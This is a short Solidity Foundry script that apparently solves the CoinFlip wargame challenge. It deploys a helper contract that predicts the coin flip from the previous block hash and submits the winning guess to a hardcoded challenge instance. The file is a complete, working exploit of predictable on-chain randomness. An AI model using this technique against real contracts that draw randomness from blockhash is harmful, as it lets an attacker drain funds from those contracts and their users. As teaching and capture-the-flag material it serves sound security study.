// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract CorrectGuesser {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip constant coinFlipInstance =
        CoinFlip(0xd2C014D40bc3747F57d16dc6778f025443A23D8e);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new CorrectGuesser(coinFlipInstance);

        console.log(coinFlipInstance.consecutiveWins());

        vm.stopBroadcast();
    }
}
